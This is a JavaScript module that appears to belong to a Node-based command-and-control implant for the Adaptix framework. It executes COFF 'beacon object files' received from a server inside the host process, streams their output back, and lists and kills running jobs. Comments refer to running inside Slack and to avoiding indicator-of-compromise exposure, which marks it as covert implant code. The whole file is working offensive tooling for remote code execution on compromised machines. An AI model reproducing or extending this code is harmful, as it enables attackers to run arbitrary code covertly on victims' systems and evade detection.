// bof.js — COMMAND_EXEC_BOF (50): in-process COFF (BOF) execution.
//
// Task framing (server->agent, LITTLE-endian, verified against pl_main.go:974
// + Commander.cpp CmdExecBof):
//   [u32 commandId=50][u8 async][bytes entry ("go")][bytes coff][bytes args][u32 taskId]
//
// Reply (agent->server, BIG-endian — the C++ CmdExecBof sync path):
//   <BOF output frames...>            — each [u32 taskId][u32 51][u32 type][u32 len][data]
//   [u32 taskId][u32 50][u8 state]    — state 0 = finished, 1 = async started
//
// Every COFF runs on its own native thread (milestone 12 — c0rnbread's model):
//   sync  -> native.run(...):  thread + wait(timeoutMs) + frames in this tick's reply.
//                              A hanging BOF is terminated at the timeout instead of
//                              freezing the agent's event loop.
//   async -> native.start(...): job launches; we reply [taskId][50][u8 1] immediately;
//                              output frames stream via pump() -> native.collect() each
//                              tick; the thread appends the final [taskId][50][u8 0].
//
// Jobs surface (C++ Commander parity):
//   46 JOBS_LIST: [taskId][46][u32 count]{[u32 jobId][u16 jobType=5][u16 0]}
//                 (async BOFs only for now — downloads are a separate jobType, TODO)
//   47 JOBS_KILL: [u32 jobId][u32 taskId] -> [taskId][47][u8 found][u32 jobId]
//                 (task array: [47, int(taskId-hex)] — pl_main.go "jobs"/"kill")
//
// If the addon is missing we answer with the same COMMAND_ERROR /
// ERROR_NOT_SUPPORTED(50) pair the C++ emits when its async BOF manager is
// unavailable.

const path = require('path');

const CP_JOBS_LIST = 46;
const CP_JOBS_KILL = 47;
const JOB_TYPE_ASYNCBOF = 0x5;

const COMMAND_ERROR = 0x1111ffff; // Commander.h
const ERROR_NOT_SUPPORTED = 50;   // win32

// sync default: 60 s (a stuck sync BOF used to freeze the WHOLE agent loop —
// milestone 11's biggest robustness gap). 0 disables. Async defaults to no
// deadline (C++ parity); both env-overridable.
const SYNC_TIMEOUT_MS = parseInt(process.env.ADAPTIX_BOF_SYNC_TIMEOUT || '60000', 10);
const ASYNC_TIMEOUT_MS = parseInt(process.env.ADAPTIX_BOF_ASYNC_TIMEOUT || '0', 10);

// candidates: env override, payload dir (bundled), repo layout (dev)
let cached = null;
function loader() {
  if (cached !== null) return cached.module;
  const candidates = [
    process.env.ADAPTIX_COFFLOADER,
    path.join(__dirname, 'coffloader.node'),
    path.join(__dirname, '..', 'native', 'coffloader.node'),
    path.join(__dirname, 'native', 'coffloader.node'),
  ].filter(Boolean);
  for (const c of candidates) {
    try {
      cached = { module: require(c) };
      return cached.module;
    } catch (_) { /* next candidate */ }
  }
  cached = { module: null };
  return null;
}

// handleTask(50): returns an OutPacker reply or null on parse error
function handleExecBof(commandId, r, cfg, state, OutPacker) {
  const isAsync = r.u8();
  const entry = r.str(); // server hardcodes "go"; PackArray string (NUL-stripped)
  const coff = r.raw();
  const args = r.raw();
  const taskId = r.u32();

  const out = new OutPacker();
  const native = loader();

  if (process.env.ADAPTIX_DEBUG === '1') console.log(`[bof] EXEC_BOF taskId=0x${taskId.toString(16)} async=${isAsync} coff=${coff.length}B`);

  if (!native) {
    return out.u32(taskId).u32(COMMAND_ERROR).u32(ERROR_NOT_SUPPORTED);
  }

  const argBuf = args.length ? args : Buffer.alloc(0);

  if (isAsync && typeof native.start === 'function') {
    // ASYNC: launched; "started" ack now, output streams via pump()
    const started = native.start(taskId, entry, coff, argBuf, ASYNC_TIMEOUT_MS);
    if (started) { bofActive = true; return out.u32(taskId).u32(commandId).u8(1); }
    return out.u32(taskId).u32(COMMAND_ERROR).u32(8); // ERROR_NOT_ENOUGH_MEMORY (C++ parity)
  }
  // SYNC (also the async fallback on a v1 addon): run + collect in one tick
  const frames = native.run(taskId, entry, coff, argBuf, SYNC_TIMEOUT_MS);
  bofActive = true;
  for (const f of frames) out.parts.push(f);
  return out.u32(taskId).u32(commandId).u8(0);
}

// JOBS_LIST (46): async BOF jobs (jobId = taskId, type 0x5, pid 0)
function handleJobsList(commandId, r, state, OutPacker) {
  const taskId = r.u32();
  const native = loader();
  const ids = native && native.jobs ? native.jobs() : [];
  const out = new OutPacker();
  out.u32(taskId).u32(commandId).u32(ids.length);
  for (const id of ids) out.u32(id).u16(JOB_TYPE_ASYNCBOF).u16(0);
  return out;
}

// JOBS_KILL (47): [u32 jobId][u32 taskId] -> [taskId][47][u8 found][u32 jobId]
function handleJobsKill(commandId, r, state, OutPacker) {
  const jobId = r.u32();
  const taskId = r.u32();
  const native = loader();
  const found = !!(native && native.stop && native.stop(jobId));
  if (process.env.ADAPTIX_DEBUG === '1') console.log(`[bof] JOBS_KILL jobId=0x${jobId.toString(16)} found=${found}`);
  const out = new OutPacker();
  return out.u32(taskId).u32(commandId).u8(found ? 1 : 0).u32(jobId);
}

let bofActive = false; // set once an EXEC_BOF task actually loaded the addon —
                        // the tick pump must NOT eagerly require() the .node into
                        // the host process (crashed Slack: V8 execute-violation on
                        // mid-lifecycle addon load; also needless IOC exposure)

// tick pump: drain streamed async-BOF frames into the reply stream
function pump(out, log) {
  if (!bofActive) return;
  const native = loader();
  if (!native || typeof native.collect !== 'function') return;
  const frames = native.collect();
  if (frames.length) {
    for (const f of frames) out.parts.push(f);
    if (log) log(`[bof] streamed ${frames.length} async frame(s)`);
  }
}

module.exports = { handleExecBof, handleJobsList, handleJobsKill, pump, loader };
